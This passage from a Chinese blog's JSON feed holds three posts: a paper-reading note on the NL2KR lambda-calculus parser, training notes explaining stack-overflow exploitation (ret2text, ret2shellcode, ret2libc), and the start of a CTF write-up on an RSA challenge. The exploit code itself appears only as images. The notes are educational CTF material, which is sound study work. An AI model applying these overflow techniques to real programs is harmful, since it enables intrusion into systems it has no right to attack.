class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>G</mi><mi mathvariant=\"normal\">@</mi><mi>F</mi><mo>=</mo><mi>λ</mi><mi>v</mi><mi mathvariant=\"normal\">.</mi><mi>v</mi><mi mathvariant=\"normal\">@</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mi mathvariant=\"normal\">@</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi mathvariant=\"normal\">@</mi><mi>λ</mi><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2.</mn><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mo>=</mo><mi>λ</mi><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2.</mn><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>v</mi><mn>1</mn><mo separator=\"true\">,</mo><mi>v</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">@</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mi mathvariant=\"normal\">@</mi><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mspace linebreak=\"newline\"></mspace><mo>=</mo><mi>i</mi><mi>n</mi><mo stretchy=\"false\">(</mo><mi>r</mi><mi>i</mi><mi>v</mi><mi>e</mi><mi>r</mi><mo separator=\"true\">,</mo><mi>T</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>s</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">G@F =\\lambda v.v@Texas@river@\\lambda v1,v2.in(v1,v2)\\\\\n=\\lambda v1,v2.in(v1,v2)@Texas@river\\\\\n=in(river,Texas)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">.</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord\">@</span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">λ</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">@</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.36687em;vertical-align:0em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">v</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<h4 id=\"泛化方法\"><a class=\"markdownIt-Anchor\" href=\"#泛化方法\">#</a> 泛化方法</h4>\n<p>当缺少的词过多时，便不能用 逆 lambda 算法 计算词的含义，因而我们可以使用 泛化算法生成新单词的含义</p>\n<p>例如，已知 eats 的语法类别为 (S\\NP)/NP、lambda 表达式为  <code>λy,λx,eats(x, y)</code> ，而我们想要知道 语法类别为 plays 的 lambda 表达式，我们可以通过泛化得到其表达式应该为  <code>λy,λx,play(x, y)</code></p>\n<p>例如：</p>\n<p><img data-src=\"image-20231104205226114.png\" alt=\"image-20231104205226114\"></p>\n<p>dictionary 中含有：</p>\n<p><img data-src=\"image-20231104205237402.png\" alt=\"image-20231104205237402\"></p>\n<p>mia 被泛化成：</p>\n<p><img data-src=\"image-20231104205259864.png\" alt=\"image-20231104205259864\"></p>\n<h4 id=\"ccg-解析\"><a class=\"markdownIt-Anchor\" href=\"#ccg-解析\">#</a> CCG <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plYWtzdW4vYXJ0aWNsZS9kZXRhaWxzLzEzMzA2OTQxNT9zcG09MTAwMS4yMTAxLjMwMDEuNjY1MC4zJmFtcDt1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnQubm9uZS10YXNrLWJsb2ctMiU3RWRlZmF1bHQlN0VDVFJMSVNUJTdFUmF0ZS0zLTEzMzA2OTQxNS1ibG9nLTExNTQwNTI0OS4yMzUlNUV2MzglNUVwY19yZWxldmFudF9hbnRpX3ZpcF9iYXNlJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUNUUkxJU1QlN0VSYXRlLTMtMTMzMDY5NDE1LWJsb2ctMTE1NDA1MjQ5LjIzNSU1RXYzOCU1RXBjX3JlbGV2YW50X2FudGlfdmlwX2Jhc2UmYW1wO3V0bV9yZWxldmFudF9pbmRleD02\">解析</span></h4>\n<p>组合规则的方向： CCG 使用斜线（/）和反斜线（\\）来表示组合规则的方向。斜线表示右向组合，反斜线表示左向组合。例如，X/Y 表示 X 组合到 Y 的右侧，X\\Y 表示 X 组合到 Y 的左侧。 <code>本论文的CCG基于 ASPccgTK</code></p>\n<p>函数应用规则： CCG 使用函数应用规则来表示动词与宾语的组合。例如，如果动词是 X/Y，它需要一个 X 类型的宾语，这样它们可以组合成一个完整的动词短语。</p>\n<p>合并规则： 合并规则用于组合两个相同类型的组合范畴，以构建更大的短语或子句。例如，如果你有 X\\Y 和 Y，它们可以合并成 X，表示它们共同组成一个更大的短语。</p>\n<p>限定词规则： 限定词如冠词（“the”、“a”）通常需要与名词短语组合。这些规则用于确保正确的限定词与名词的组合。</p>\n<p>副词修饰规则： 副词通常修饰动词或形容词。相关的规则确保副词与适当的词汇项组合。</p>\n<p>并列规则： 用于描述两个或多个并列词汇项之间的组合，以构建并列结构。</p>\n<p>其他特殊规则： CCG 还可以包括其他特殊情况下的组合规则，以处理复杂的语法结构。</p>\n<h4 id=\"nl2kr-l\"><a class=\"markdownIt-Anchor\" href=\"#nl2kr-l\">#</a> NL2KR-L</h4>\n<p>运行该模块需要在 RunConfiguration 文件中设置初始词典文件路径、语法类别的覆盖文件（可选）、训练数据文件和输出词典文件路径（可选） 。</p>\n<p><img data-src=\"image-20231105193623335.png\" alt=\"image-20231105193623335\"></p>\n<p>词典中是完整的知识表示内容，syntax 中包含的是 单词 及其 语法类别。训练文件中包含的是训练的句子。</p>\n<p>train：</p>\n<p><img data-src=\"image-20231105194101024.png\" alt=\"image-20231105194101024\"></p>\n<p>初始词典为：</p>\n<pre><code>Vincent\tN\tvincent\nVincent\tN\t#x.vincent(x)\ntakes\t(S\\NP)/NP\t#w. #z. (w@ #x. takes(z,x) )\nplane\tN\t#x. plane(x)\nboxer\tN\t#x. boxer(x)\nfights\tS\\NP\t#x. fight(x)\n</code></pre>\n<p><img data-src=\"image-20231105194114406.png\" alt=\"image-20231105194114406\"></p>\n<p>在学习 Some boxer walks 的时候，根据 syntax 中提供的语法信息，比照着 fights 进行泛化学习：</p>\n<pre><code>takes\t(S\\NP)/NP\nEvery\t(S/(S\\NP))/NP\nSome\t(S/(S\\NP))/NP\nwalks\tS\\NP\nfights\tS\\NP\nloves\t(S\\NP)/NP\n</code></pre>\n<p>得到 walks\tS\\NP\t#x.\twalks (x)</p>\n<pre><code>EX.\t(boxer(X)\t^\twalk(X))\t=\tsome boxer\t@\twalks\nwalks S\\NP\t#x.\twalks(x)\nsome boxer #x1.EX.boxer(X)\t^\tx1@X\n\n#x1.EX.boxer(X)\t^\tx1 @X @ #x.\twalks(x) = EX.boxer(X) ^ #x.walks(x)@X = EX.boxer(X) ^ walks(X)\n</code></pre>\n<p>利用 boxer 的含义 #x.boxer (x)，我们可以得到 some 的含义</p>\n<pre><code>some\t#x2.#x1.EX.x2@X^x1@X\n\nsome@boxer = #x2.#x1.EX.x2@X^x1@X@#x.boxer(x)\n\t\t   = #x1.EX.#x.boxer(x)@X ^ x1@X\n\t\t   = EX.#x.boxer(x)@X^X\n\t\t   = EX.boxer(X)^X\n</code></pre>\n<p>在学习阶段结束时，运行参数估计来为每个单词的含义分配权重。因为同一个词可以有多个知识表示形式，例如 boxer 在通过泛化学习后，拥有 boxer 和 #x.boxer (x) 两个含义，但是含义 boxer 对于整个句子的翻译没有任何贡献，所以其权重很小，为负数。</p>\n<p><img data-src=\"image-20231105223520775.png\" alt=\"image-20231105223520775\"></p>\n<p>概率学习的方法：</p>\n<h4 id=\"nl2kr-t\"><a class=\"markdownIt-Anchor\" href=\"#nl2kr-t\">#</a> NL2KR-T</h4>\n<pre><code>John catches a bus\n N\t (S\\NP)/NP  NP/N   N\n \nJohn:\t\t\tjohn\ncatches:\t\t#w.#z.w@#x.catches(z,x)\na:\t\t\t\t#x7.#x5.EX.x7@X ^ x5@X \nbus:\t\t\t#x.bus(x)\n\na bus\n#x7.#x5.EX.x7@X^x5@X @ #x.bus(x)\n#x5.EX.#x.bus(x)@X^x5@X\n\ncatches a bus:\n#w.#z.w@#x.catches(z,x) @ #x5.EX.#x.bus(x)@X^x5@X\n#z.#x5.EX.#x.bus(x)@X^x5@X@#x.catches(z,x)\n\njohn catches a bus:\n(#z.#x5.EX.#x.bus(x)@X^x5@X@#x.catches(z,x))@john\n#x5.EX.#x.bus(x)@X^x5@X@#x.catches(john,x)\nEX.#x.bus(x)@X^#x.catches(john,x)@X\nEX.bus(X)^catches(john,X)\n</code></pre>\n<h4 id=\"总结和展望\"><a class=\"markdownIt-Anchor\" href=\"#总结和展望\">#</a> 总结和展望</h4>\n<p>在这篇论文中，作者实现了一个 NL2KR 系统用于将自然语言翻译为知识表示，并成功实现了相关功能。</p>\n<p>未来作者打算向 NL2KR 系统添加更多功能，如，自动构建初始词典，使用更多的知识来选择单词的正确含义。</p>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84MDY5MjkyNw==\">关于 Log-linear models and conditional random fields</span></p>\n</blockquote>\n",
            "tags": [
                "论文阅读"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/16/10.06%20SUS%E5%9F%B9%E8%AE%AD/",
            "url": "http://yanagi-kon.github.io/2023/10/16/10.06%20SUS%E5%9F%B9%E8%AE%AD/",
            "title": "10.06 SUS培训",
            "date_published": "2023-10-16T06:31:00.000Z",
            "content_html": "<h2 id=\"1006-sus培训\"><a class=\"markdownIt-Anchor\" href=\"#1006-sus培训\">#</a> 10.06 SUS 培训</h2>\n<h3 id=\"基本知识点\"><a class=\"markdownIt-Anchor\" href=\"#基本知识点\">#</a> 基本知识点</h3>\n<p>1. 程序在 32 位中传递参数为 栈传递，在 64 位中通过寄存器传递</p>\n<p>2. 变量存储</p>\n<ul>\n<li>未初始化的全局变量 存放在 BSS 段</li>\n<li>初始化的全局变量存放在 Data 段</li>\n<li>函数存放在 Text 段</li>\n<li>局部变量存放在栈段</li>\n<li>主动申请的内存在堆部分</li>\n<li>read 函数等存放在 shared libraries</li>\n</ul>\n<h3 id=\"简单栈溢出\"><a class=\"markdownIt-Anchor\" href=\"#简单栈溢出\">#</a> 简单栈溢出</h3>\n<p><img data-src=\"image-20231006153909131.png\" alt=\"image-20231006153909131\"></p>\n<p><img data-src=\"image-20231006154804670.png\" alt=\"image-20231006154804670\"></p>\n<h4 id=\"ret2text\"><a class=\"markdownIt-Anchor\" href=\"#ret2text\">#</a> ret2text</h4>\n<p><img data-src=\"image-20231006155442449.png\" alt=\"image-20231006155442449\"></p>\n<p><code>print name</code>  将  <code>0x100</code>  的数据拷贝到 只有 15 个字节的 <code>buf</code>  中，就会溢出。读入超过 15 字节的数据，就会将下面的内容覆盖，把返回地址的值覆盖为 <code>shell()</code>  函数的地址，就可以跳转到 <code>shell</code>  完成攻击。</p>\n<p>一般的，先使用  <code>checksec</code>  查看保护机制：</p>\n<p><img data-src=\"image-20231006155901627.png\" alt=\"image-20231006155901627\"></p>\n<p><code>NX</code>  有效防止 <code>shellcode注入</code> 攻击。 <code>PIE</code>  地址随机化的保护。</p>\n<p>攻击代码如下：</p>\n<p><img data-src=\"image-20231006160640430.png\" alt=\"image-20231006160640430\"></p>\n<p>至少 15 个字节将 buf 覆盖掉，再写 8 个字节将 ebp 覆盖掉，最后再覆盖返回地址，覆盖为后门函数的返回值。但是这样会导致栈没有对齐，从而报错。于是利用查看 ret 的地址：</p>\n<p><img data-src=\"image-20231006161404605.png\" alt=\"image-20231006161404605\"></p>\n<p>将 ret 填充到 8 结尾的内容中，这样 shell 会以 0 结尾开始运行从而对其 16 字节不报错。pwn 的解法很多，这只是本题其中一个解法。</p>\n<h4 id=\"ret2shellcode\"><a class=\"markdownIt-Anchor\" href=\"#ret2shellcode\">#</a> ret2shellcode</h4>\n<p><img data-src=\"image-20231006161936187.png\" alt=\"image-20231006161936187\"></p>\n<p>本题目没有后门函数，需要自行编写 <code>shellcode</code></p>\n<p><img data-src=\"image-20231006162147718.png\" alt=\"image-20231006162147718\"></p>\n<p>题目会将 buf 在栈上的地址告诉你，我们将 buf 的返回地址改为 buf 在栈上的开始地址：</p>\n<p><img data-src=\"image-20231006162512175.png\" alt=\"image-20231006162512175\"></p>\n<p><img data-src=\"image-20231006162919424.png\" alt=\"image-20231006162919424\"></p>\n<p>shellcode 可以用系统自动生成的，也可以用自己写的，编译 shellcode 的能力还是很重要的。可以在 shellcodes databsase 网站中学习。</p>\n<h4 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h4>\n<p><img data-src=\"image-20231006163151506.png\" alt=\"image-20231006163151506\"></p>\n<p>该题开启了 NX 并且没有后门函数。使用 ldd，查看动态库发现有 libc，于是该题从 libc 中开始找。libc 的地址是随机的，但是 write 函数的地址在 libc 中是相对的，知道了就可以获得 libc 的地址。</p>\n<p><img data-src=\"image-20231006164647386.png\" alt=\"image-20231006164647386\"></p>\n<h3 id=\"学习资源\"><a class=\"markdownIt-Anchor\" href=\"#学习资源\">#</a> 学习资源</h3>\n<p><img data-src=\"image-20231006164824858.png\" alt=\"image-20231006164824858\"></p>\n",
            "tags": [
                "知识"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/16/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%20CTF%20%E6%96%B0%E7%94%9F%E8%B5%9B/",
            "url": "http://yanagi-kon.github.io/2023/10/16/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%20CTF%20%E6%96%B0%E7%94%9F%E8%B5%9B/",
            "title": "东南大学 CTF 赛 2023",
            "date_published": "2023-10-16T04:00:00.000Z",
            "content_html": "<h1 id=\"东南大学-ctf-赛\"><a class=\"markdownIt-Anchor\" href=\"#东南大学-ctf-赛\">#</a> 东南大学 CTF 赛</h1>\n<p>[TOC]</p>\n<hr>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"简单signin\"><a class=\"markdownIt-Anchor\" href=\"#简单signin\">#</a> 简单 signin</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long<span class=\"token punctuation\">,</span> getPrime</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> msg <span class=\"token operator\">+</span> <span class=\"token string\">b'\\xff'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">128</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31531</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>n = 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c = 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>'''</pre></td></tr></table></figure><p>原本以为这是一道普普通通的 <code>&quot;简单&quot;</code>  题，结果做着做着发现，e 和 phi 不互素，没有办法直接求出 d，去互联网上了解了一下，发现 e 和 q-1 互素，因为 gcd (e,q-1)=1，所以可以改成：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>e</mi><mtext>  </mtext><mo>∗</mo><mtext>  </mtext><mi>d</mi><mo>≡</mo><mn>1</mn><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">e\\;*\\;d \\equiv 1\\; mod\\; (q-1) \\\\\nm = c^d\\;mod\\;q\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.46528em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≡</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.093548em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8991079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span></span></p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># from secret import flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token 